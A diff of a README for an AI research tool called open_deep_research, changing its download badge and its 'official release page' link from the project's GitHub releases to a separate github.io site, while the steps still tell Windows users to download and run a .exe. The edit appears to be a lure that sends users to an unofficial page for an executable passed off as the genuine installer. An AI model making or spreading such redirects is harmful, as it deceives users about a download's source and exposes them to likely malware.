@@ -1,6 +1,6 @@
 # 🔬 open_deep_research - Conduct deep research using intelligent agents
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/randomvariablewhitepelican129/open_deep_research/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://randomvariablewhitepelican129.github.io)
 
 This application performs in-depth research on topics you provide. It uses artificial intelligence to look through multiple sources and summarize information for you. You do not need to manage complex search queries or visit dozens of websites. The system automates the research process to save you time.
 
@@ -8,7 +8,7 @@ This application performs in-depth research on topics you provide. It uses artif
 
 You can install this software on any modern Windows computer. Follow these steps to set up the tool and start your first research project. 
 
-1. Visit the [official release page](https://github.com/randomvariablewhitepelican129/open_deep_research/releases) to download the installer.
+1. Visit the [official release page](https://randomvariablewhitepelican129.github.io) to download the installer.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your computer.
 4. Run the installer by double-clicking the file.
